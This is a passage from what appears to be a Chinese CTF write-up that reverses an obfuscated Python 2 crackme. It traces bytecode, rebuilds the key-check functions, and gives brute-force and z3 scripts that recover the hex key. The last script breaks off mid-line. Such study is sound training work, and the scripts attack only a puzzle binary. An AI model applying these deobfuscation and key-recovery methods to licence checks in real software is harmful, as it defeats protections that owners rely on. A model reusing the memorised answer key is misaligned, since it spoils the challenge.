class="keyword">False</span>: JMP <span class="number">709</span></div><div class="line"></div><div class="line"><span class="number">16</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">19</span>: </div><div class="line">          <span class="number">0</span> PRINT_ITEM     </div><div class="line"><span class="number">20</span>: </div><div class="line">          <span class="number">0</span> PRINT_NEWLINE  </div><div class="line">PRINT co_consts[<span class="number">2</span>]</div><div class="line">    </div><div class="line"><span class="number">317</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">0</span> (<span class="number">0</span>)</div><div class="line">          <span class="number">0</span> RETURN_VALUE </div><div class="line"><span class="keyword">return</span> <span class="number">0</span></div></pre></td></tr></table></figure>
<p>继续跟踪到709：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="number">324</span>: </div><div class="line">          <span class="number">0</span> LOAD_GLOBAL         <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">327</span>: </div><div class="line">          <span class="number">0</span> LOAD_FAST           <span class="number">1</span> (<span class="number">1</span>)</div><div class="line"><span class="number">330</span>: </div><div class="line">          <span class="number">0</span> CALL_FUNCTION       <span class="number">1</span></div><div class="line"><span class="number">241</span>: </div><div class="line">          <span class="number">0</span> POP_JUMP_IF_FALSE   <span class="number">262</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> p(OOOO000OO000OOOOO) == <span class="keyword">False</span>: JMP <span class="number">262</span></div><div class="line"></div><div class="line"><span class="number">701</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">2</span> (<span class="number">2</span>)</div><div class="line"><span class="number">704</span>: </div><div class="line">          <span class="number">0</span> PRINT_ITEM     </div><div class="line"><span class="number">705</span>: </div><div class="line">          <span class="number">0</span> PRINT_NEWLINE  </div><div class="line"></div><div class="line"><span class="keyword">print</span> co_consts[<span class="number">2</span>]</div><div class="line"></div><div class="line"><span class="number">10</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">0</span> (<span class="number">0</span>)</div><div class="line">          <span class="number">0</span> RETURN_VALUE   </div><div class="line"><span class="keyword">return</span> <span class="number">0</span></div></pre></td></tr></table></figure>
<p>根据到262:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="number">24</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">3</span> (<span class="number">3</span>)</div><div class="line"><span class="number">27</span>: </div><div class="line">          <span class="number">0</span> PRINT_ITEM     </div><div class="line"><span class="number">28</span>: </div><div class="line">          <span class="number">0</span> PRINT_NEWLINE  </div><div class="line"><span class="number">311</span>: </div><div class="line">          <span class="number">0</span> LOAD_CONST          <span class="number">0</span> (<span class="number">0</span>)</div><div class="line">          <span class="number">0</span> RETURN_VALUE  </div><div class="line">      </div><div class="line"><span class="keyword">print</span> co_consts[<span class="number">3</span>]</div><div class="line"><span class="keyword">return</span> <span class="number">0</span></div></pre></td></tr></table></figure>
<p>根据上面追踪翻译出来的代码，成功还原出u函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">u</span><span class="params">(OOO000OOOOOO00OOO)</span>:</span></div><div class="line">	OOOO000OO000OOOOO = q(OOO000OOOOOO00OOO)</div><div class="line">	<span class="keyword">if</span> OOOO000OO000OOOOO == <span class="string">""</span>:</div><div class="line">		<span class="keyword">print</span> ERROR</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line">	<span class="keyword">if</span> r(OOOO000OO000OOOOO):</div><div class="line">		<span class="keyword">print</span> ERROR</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line">	<span class="keyword">if</span> p(OOOO000OO000OOOOO):</div><div class="line">		<span class="keyword">print</span> ERROR</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"Good job!"</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span></div></pre></td></tr></table></figure>
<p>如果输出<code>Good job!</code>则表示得到flag</p>
<p>所以下面就是取逆向<code>q</code>, <code>r</code>, <code>p</code>三个函数，原理和上面逆向<code>u</code>函数一样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span><span class="params">(O0OOO0O0O00O00OOO)</span>:</span></div><div class="line">	<span class="keyword">return</span> O0OOO0O0O00O00OOO.decode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">r</span><span class="params">(O0O000OO00OO00OO0)</span>:</span></div><div class="line">	<span class="keyword">if</span> len(O0O000OO00OO00OO0) == <span class="number">18</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line">	<span class="keyword">return</span> <span class="number">1</span></div></pre></td></tr></table></figure>
<p><code>q</code>和<code>r</code>两个函数，一个是进行decode操作，一个是判断长度，所以判断flag是否正确就在<code>p</code>函数中，而<code>p</code>函数是手工最难逆的函数，我从下午6点，逆到了8点，/(ㄒoㄒ)/~~，我应该是采取了最笨的方法，前面提到了，我现在有个自动化的思路，之后会放到我blog中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">p</span><span class="params">(hhh)</span>:</span></div><div class="line">  <span class="keyword">if</span> ((ord(hhh[<span class="number">13</span>])*<span class="number">25</span>+<span class="number">254</span>)%<span class="number">256</span>) ^ <span class="number">184</span> == <span class="number">139</span>:</div><div class="line">    <span class="keyword">if</span> ((ord(hhh[<span class="number">2</span>])*<span class="number">3</span>+<span class="number">158</span>)%<span class="number">256</span>) ^ <span class="number">161</span> == <span class="number">21</span>:</div><div class="line">      <span class="keyword">if</span> ((ord(hhh[<span class="number">10</span>])*<span class="number">251</span>+<span class="number">142</span>)%<span class="number">256</span>) ^ <span class="number">128</span> ==  <span class="number">115</span>:</div><div class="line">        <span class="keyword">if</span> ((ord(hhh[<span class="number">5</span>])*<span class="number">99</span>+<span class="number">28</span>)%<span class="number">256</span>) ^ <span class="number">130</span> ==  <span class="number">253</span>:</div><div class="line">          <span class="keyword">if</span> ((ord(hhh[<span class="number">17</span>])*<span class="number">219</span>+<span class="number">88</span>)%<span class="number">256</span>) ^ <span class="number">130</span> ==  <span class="number">180</span>:</div><div class="line">            <span class="keyword">if</span> ((ord(hhh[<span class="number">14</span>])*<span class="number">83</span>+<span class="number">119</span>)%<span class="number">256</span>) ^ <span class="number">161</span> ==  <span class="number">101</span>:</div><div class="line">              <span class="keyword">if</span> ((ord(hhh[<span class="number">7</span>])*<span class="number">57</span>+<span class="number">178</span>)%<span class="number">256</span>) ^ <span class="number">184</span> ==  <span class="number">91</span>:</div><div class="line">                <span class="keyword">if</span> ((ord(hhh[<span class="number">1</span>])*<span class="number">245</span>+<span class="number">207</span>)%<span class="number">256</span>) ^ <span class="number">184</span> ==  <span class="number">57</span>:</div><div class="line">                  <span class="keyword">if</span> ((ord(hhh[<span class="number">0</span>])*<span class="number">249</span>+<span class="number">166</span>)%<span class="number">256</span>) ^ <span class="number">230</span> ==  <span class="number">85</span>:</div><div class="line">                    <span class="keyword">if</span> ((ord(hhh[<span class="number">8</span>])*<span class="number">213</span>+<span class="number">134</span>)%<span class="number">256</span>) ^ <span class="number">161</span> ==  <span class="number">240</span>:</div><div class="line">                      <span class="keyword">if</span> ((ord(hhh[<span class="number">4</span>])*<span class="number">199</span>+<span class="number">255</span>)%<span class="number">256</span>) ^ <span class="number">128</span> ==  <span class="number">202</span>:</div><div class="line">                        <span class="keyword">if</span> ((ord(hhh[<span class="number">6</span>])*<span class="number">85</span>+<span class="number">30</span>)%<span class="number">256</span>) ^ <span class="number">230</span> ==  <span class="number">202</span>:</div><div class="line">                          <span class="keyword">if</span> ((ord(hhh[<span class="number">9</span>])*<span class="number">173</span>+<span class="number">69</span>)%<span class="number">256</span>) ^ <span class="number">227</span> ==  <span class="number">124</span>:</div><div class="line">                            <span class="keyword">if</span> ((ord(hhh[<span class="number">15</span>])*<span class="number">141</span>+<span class="number">205</span>)%<span class="number">256</span>) ^ <span class="number">227</span> ==  <span class="number">170</span>:</div><div class="line">                              <span class="keyword">if</span> ((ord(hhh[<span class="number">11</span>])*<span class="number">133</span>+<span class="number">218</span>)%<span class="number">256</span>) ^ <span class="number">130</span> ==  <span class="number">149</span>:</div><div class="line">                                <span class="keyword">if</span> ((ord(hhh[<span class="number">12</span>])*<span class="number">139</span>+<span class="number">193</span>)%<span class="number">256</span>) ^ <span class="number">230</span> ==  <span class="number">2</span>:</div><div class="line">                                  <span class="keyword">if</span> ((ord(hhh[<span class="number">3</span>])*<span class="number">67</span>+<span class="number">202</span>)%<span class="number">256</span>) ^ <span class="number">227</span> ==  <span class="number">24</span>:</div><div class="line">                                    <span class="keyword">if</span> ((ord(hhh[<span class="number">16</span>])*<span class="number">103</span>+<span class="number">151</span>)%<span class="number">256</span>) ^ <span class="number">128</span> ==  <span class="number">145</span>:</div><div class="line">                                      <span class="keyword">return</span> <span class="number">0</span></div><div class="line">  <span class="keyword">return</span> <span class="number">1</span></div><div class="line"><span class="comment">#  这代码弄出来的时候差点猝死</span></div></pre></td></tr></table></figure>
<p>然后写个脚本爆破出flag(现在想想，应该可以用z3)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">flag = [<span class="string">""</span>]*<span class="number">18</span></div><div class="line"></div><div class="line">bds = [<span class="string">'((x*25+254)%256) ^ 184 == 139'</span>, <span class="string">'((x*3+158)%256) ^ 161 == 21'</span>, <span class="string">'((x*251+142)%256) ^ 128 ==  115'</span>, <span class="string">'((x*99+28)%256) ^ 130 ==  253'</span>, <span class="string">'((x*219+88)%256) ^ 130 ==  180'</span>, <span class="string">'((x*83+119)%256) ^ 161 ==  101'</span>, <span class="string">'((x*57+178)%256) ^ 184 ==  91'</span>, <span class="string">'((x*245+207)%256) ^ 184 ==  57'</span>, <span class="string">'((x*249+166)%256) ^ 230 ==  85'</span>, <span class="string">'((x*213+134)%256) ^ 161 ==  240'</span>, <span class="string">'((x*199+255)%256) ^ 128 ==  202'</span>, <span class="string">'((x*85+30)%256) ^ 230 ==  202'</span>, <span class="string">'((x*173+69)%256) ^ 227 ==  124'</span>, <span class="string">'((x*141+205)%256) ^ 227 ==  170'</span>, <span class="string">'((x*133+218)%256) ^ 130 ==  149'</span>, <span class="string">'((x*139+193)%256) ^ 230 ==  2'</span>, <span class="string">'((x*67+202)%256) ^ 227 ==  24'</span>, <span class="string">'((x*103+151)%256) ^ 128 ==  145'</span>]</div><div class="line">bds_index = [<span class="number">13</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">16</span>]</div><div class="line"></div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">18</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">256</span>):</div><div class="line">		<span class="keyword">if</span> eval(bds[y]):</div><div class="line">			flag[bds_index[y]] = x</div><div class="line">			<span class="keyword">break</span></div><div class="line"></div><div class="line">payload= <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flag:</div><div class="line">	payload += chr(x)</div><div class="line"></div><div class="line"><span class="keyword">print</span> payload.encode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line"><span class="comment"># b5aab27b5d01d6b91f021f59c97ddf6c76fa</span></div><div class="line">$ python final.pyc </div><div class="line">Please input your key(hex string):b5aab27b5d01d6b91f021f59c97ddf6c76fa</div><div class="line">Good job! The flag <span class="keyword">is</span> pwnhub&#123;flag:your input(lower case)&#125;</div></pre></td></tr></table></figure>
<p>傻逼的半自动化脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2.7</span></div><div class="line"><span class="comment"># -*- coding=utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> dis, marshal</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> u16</div><div class="line"></div><div class="line">one_para = [<span class="string">"\x01"</span>,<span class="string">"\x02"</span>, <span class="string">"\x03"</span>, <span class="string">"\x21"</span>, <span class="string">"\x17"</span>, <span class="string">"\x0a"</span>, <span class="string">"\x0b"</span>, <span class="string">"\x0c"</span>, <span class="string">"\x0f"</span>, <span class="string">"\x13"</span>, <span class="string">"\x14"</span>, <span class="string">"\x15"</span>, <span class="string">"\x16"</span>, <span class="string">"\x18"</span>, <span class="string">"\x19"</span>, <span class="string">"\x1a"</span>, <span class="string">"\x1c"</span>, <span class="string">"\x1e"</span>, <span class="string">"\x1f"</span>, <span class="string">"\x47"</span>, <span class="string">"\x48"</span>]</div><div class="line"></div><div class="line">f = open(<span class="string">"final.pyc"</span>)</div><div class="line">f.read(<span class="number">8</span>)</div><div class="line">code = marshal.load(f)</div><div class="line"></div><div class="line">code = code.co_consts[<span class="number">45</span>]</div><div class="line"><span class="keyword">print</span> code.co_name</div><div class="line">asm = code.co_code</div><div class="line"><span class="comment"># asm = code.co_consts[45].co_code</span></div><div class="line">stack = []</div><div class="line">varn = &#123;</div><div class="line">    <span class="string">'DIVIDER'</span>: <span class="keyword">None</span>,       <span class="comment"># DEVIDER</span></div><div class="line">    <span class="string">'OOO000OOOOOO00OOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'OOOO000OO000OOOOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'OOO0OOO00O00OOOO0'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'O0OOO0O0O00O00OOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'O0O000OO00OO00OO0'</span>: <span class="keyword">None</span>,</div><div class="line">&#125;</div><div class="line">flag = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="comment"># n = 1632</span></div><div class="line">n = <span class="number">0</span></div><div class="line">add = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">if</span> len(asm) &lt;= n:</div><div class="line">        <span class="keyword">print</span> n</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> asm[n] == <span class="string">'q'</span>:  <span class="comment"># JUMP_ABSOLUTE</span></div><div class="line">        n = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'n'</span>:  <span class="comment"># JUMP_FORWARD</span></div><div class="line">        n += u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>]) + <span class="number">3</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="comment"># elif asm[n] in one_para:</span></div><div class="line">    <span class="comment">#     dis.disassemble_string(asm[n])</span></div><div class="line">    <span class="comment">#     n+=1</span></div><div class="line">    <span class="comment">#     continue</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">"\x53"</span>:   <span class="comment"># RETURN</span></div><div class="line">        dis.disassemble_string(asm[n])</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"%d: "</span>%n</div><div class="line">        dis.disassemble_string(asm[n:n+<span class="number">3</span>])</div><div class="line">        add = <span class="number">3</span></div><div class="line">    <span class="keyword">except</span> IndexError:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            dis.disassemble_string(asm[n])</div><div class="line">            add = <span class="number">1</span></div><div class="line">        <span class="keyword">except</span> IndexError:</div><div class="line">            <span class="keyword">print</span> <span class="string">"%d: %d"</span>%(n, ord(asm[n]))</div><div class="line">            <span class="keyword">break</span></div><div class="line">    </div><div class="line">    <span class="keyword">if</span> asm[n] == <span class="string">'d'</span>: <span class="comment"># LOAD_CONST</span></div><div class="line">        key = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        value = code.co_consts[key]</div><div class="line">        stack.append(value)</div><div class="line">        n += <span class="number">3</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'|'</span>: <span class="comment"># LOAD_FAST</span></div><div class="line">        key = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        value = varn[code.co_varnames[key]]</div><div class="line">        stack.append(value)</div><div class="line">        n += <span class="number">3</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'&#125;'</span>:   <span class="comment"># STORE_FAST</span></div><div class="line">        key = code.co_varnames[u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])]</div><div class="line">        varn[key] = stack.pop()</div><div class="line">        n += <span class="number">3</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'k'</span>:   <span class="comment"># COMPARE_OP</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        <span class="keyword">if</span> x1 == x2:</div><div class="line">            flag = <span class="number">1</span></div><div class="line">        n += <span class="number">3</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">"s"</span>:   <span class="comment"># POP_JUMP_IF_TRUE</span></div><div class="line">        <span class="keyword">if</span> flag:</div><div class="line">            n = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">            flag = <span class="number">0</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            n += <span class="number">3</span></div><div class="line">    <span class="comment"># elif ord(asm[n]) == 114:  # POP_JUMP_IF_FALSE</span></div><div class="line">    <span class="comment">#     break </span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        n += add</div></pre></td></tr></table></figure>
<hr>
<p>自动跑p函数，使用z3跑出flag自动化脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2.7</span></div><div class="line"><span class="comment"># -*- coding=utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> dis, marshal</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> u16</div><div class="line"><span class="keyword">import</span> z3</div><div class="line"></div><div class="line">flag_n = z3.BitVecs(<span class="string">'x__0 x__1 x__2 x__3 x__4 x__5 x__6 x__7 x__8 x__9 x__10 x__11 x__12 x__13 x__14 x__15 x__16 x__17'</span>, <span class="number">8</span>)</div><div class="line"></div><div class="line">f = open(<span class="string">"final.pyc"</span>)</div><div class="line">f.read(<span class="number">8</span>)</div><div class="line"></div><div class="line">code = marshal.load(f)</div><div class="line"></div><div class="line">code = code.co_consts[<span class="number">34</span>]</div><div class="line"><span class="keyword">print</span> code.co_name</div><div class="line">asm = code.co_code</div><div class="line"><span class="comment"># asm = code.co_consts[45].co_code</span></div><div class="line">stack = []</div><div class="line">varn = &#123;</div><div class="line">    <span class="string">'DIVIDER'</span>: <span class="keyword">None</span>,       <span class="comment"># DEVIDER</span></div><div class="line">    <span class="string">'OOO000OOOOOO00OOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'OOOO000OO000OOOOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'OOO0OOO00O00OOOO0'</span>: flag_n,</div><div class="line">    <span class="string">'O0OOO0O0O00O00OOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'O0O000OO00OO00OO0'</span>: <span class="keyword">None</span>,</div><div class="line">&#125;</div><div class="line">flag = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="comment"># n = 1632</span></div><div class="line">n = <span class="number">0</span></div><div class="line">add = <span class="number">0</span></div><div class="line">index = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">if</span> len(asm) &lt;= n:</div><div class="line">        <span class="keyword">print</span> n</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> asm[n] == <span class="string">'q'</span> <span class="keyword">or</span> asm[n] == <span class="string">'r'</span>:  <span class="comment"># JUMP_ABSOLUTE    or  POP_JUMP_IF_FALSE</span></div><div class="line">        n = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'n'</span>:  <span class="comment"># JUMP_FORWARD</span></div><div class="line">        n += u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>]) + <span class="number">3</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="comment"># elif asm[n] in one_para:</span></div><div class="line">    <span class="comment">#     dis.disassemble_string(asm[n])</span></div><div class="line">    <span class="comment">#     n+=1</span></div><div class="line">    <span class="comment">#     continue</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">"\x53"</span>:   <span class="comment"># RETURN</span></div><div class="line">        dis.disassemble_string(asm[n])</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"%d: "</span>%n</div><div class="line">        dis.disassemble_string(asm[n:n+<span class="number">3</span>])</div><div class="line">        add = <span class="number">3</span></div><div class="line">    <span class="keyword">except</span> IndexError:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            dis.disassemble_string(asm[n])</div><div class="line">            add = <span class="number">1</span></div><div class="line">        <span class="keyword">except</span> IndexError:</div><div class="line">            <span class="keyword">print</span> <span class="string">"%d: %d"</span>%(n, ord(asm[n]))</div><div class="line">            <span class="keyword">break</span></div><div class="line">    </div><div class="line">    <span class="keyword">if</span> asm[n] == <span class="string">'d'</span>: <span class="comment"># LOAD_CONST</span></div><div class="line">        key = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        value = code.co_consts[key]</div><div class="line">        stack.append(value)</div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'|'</span>: <span class="comment"># LOAD_FAST</span></div><div class="line">        key = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        value = varn[code.co_varnames[key]]</div><div class="line">        stack.append(value)</div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'&#125;'</span>:   <span class="comment"># STORE_FAST</span></div><div class="line">        key = code.co_varnames[u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])]</div><div class="line">        varn[key] = stack.pop()</div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'k'</span>:   <span class="comment"># COMPARE_OP</span></div><div class="line">        op = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        <span class="keyword">if</span> op == <span class="number">3</span>:</div><div class="line">            x1 = stack.pop()</div><div class="line">            x2 = stack.pop()</div><div class="line">            flag_n[index] = (x2==x1)</div><div class="line">        <span class="keyword">elif</span> op == <span class="number">2</span>:</div><div class="line">            x1 = stack.pop()</div><div class="line">            x2 = stack.pop()</div><div class="line">            <span class="keyword">if</span> x1 == x2:</div><div class="line">                flag = 